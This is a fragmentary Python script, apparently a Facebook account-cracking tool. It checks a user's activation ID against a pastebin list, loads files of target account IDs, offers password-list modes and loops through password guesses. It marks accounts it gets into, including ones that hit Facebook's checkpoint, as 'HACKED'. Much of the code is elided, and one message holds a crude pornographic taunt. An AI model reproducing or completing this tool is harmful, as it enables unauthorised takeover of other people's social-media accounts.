...
def sasuke():
    ...
    try:
        url = requests.get("https://pastebin.com/raw/99DSK3Cj").text
    except requests.exceptions.ConnectionError:
        print('No Internet Connection')
    if id in url:
        print("\033[92m  YOUR ID IS ACTIVE.........\033[97m")
    elif id not in url:
        print('\033[0;91mYour Id Not Activate Send Chat To @II4m_ghost')
        exit()
...
#TOOL BY DRAGON AND DEMO TEAM1667
def uaku():
	try:
...
class D:
	...
	def plerr(self):
		...
		try:
			...
			fileX = input ('\x1b[1;94m *PASSWORD2* : ')
			for line in open(fileX, 'r').readlines():
				id.append(line.strip())
			print(f'\x1b[1;91mCOLECTED ID : \x1b[1;97m'+str(len(id)))
			Settings()
		except IOError:
			print(" \x1b[1;91m\x1b[1;96m\x1b[1;97m \x1b[1;91m XALAT % sent me chat\x1b[0m"%(fileX));time.sleep(2)
			F()
#SERVER-SETTING			
def Settings():
	print(f'\x1b[1;91m\x1b[1;96m\x1b[1;97m\x1b[1;91m[\x1b[1;97m1\x1b[1;91m]\x1b[1;97mNEW FB \x1b[1;91m[XOSH]\n\x1b[1;91m\x1b[1;96m\x1b[1;97m\x1b[1;91m[\x1b[1;97m2\x1b[1;91m]\x1b[1;97mNEW+OLD\x1b[1;93m [xaw]')
	...
	print(f'\x1b[1;91m\x1b[1;96m\x1b[1;97m\x1b[1;91m[\x1b[1;97m1\x1b[1;91m]\x1b[1;97mMOBILE\x1b[1;95m [VPN BER NACHE ]')
	hc = input('\x1b[1;96mSELECT :\x1b[1;97m ')
	if hc in ['1','01']:
		method.append('mobile')
	else:
		method.append('mobile')
	pwplus=input('\x1b[1;97m[ M ] PASSWORD QWRS\x1b[1;96m [HARD]\n\x1b[1;91m\x1b[1;96m\x1b[1;97m[ A ]  PASSWORD assan\x1b[1;92m [EASY]\n\x1b[1;96mSELECT : \x1b[1;97m')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
...
def passwrd():
	...
	if woi in ['y','Y']:
		...
		print(f'\t \x1b[1;91m\x1b[1;96m\x1b[1;97m BRO SAR XNXX.COM  BYE {u} ')
		time.sleep(2)
		exit()
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r 👨‍💻✅𝑰𝑰4𝑴_𝑮𝑯𝑶𝑺𝑻✅👨‍💻 {P}{b}{loop}{P}•{b}{len(id)}{P}  • HACKED✅:{P}{H}{ok}{P} •  SWTAW😐❌:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}  "),
	sys.stdout.flush()
...
def ceker(idf,pw):
	...
	try:
		...
		print('\r%s++++ %s|%s ----> SWTAWA       %s'%(b,idf,pw,x))
	...
	for kes in akun:
		try:
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				...
				print('\r%s++++ %s|%s ----> HACKED BY HACKER1667       %s'%(h,id,pw,x))
			else:
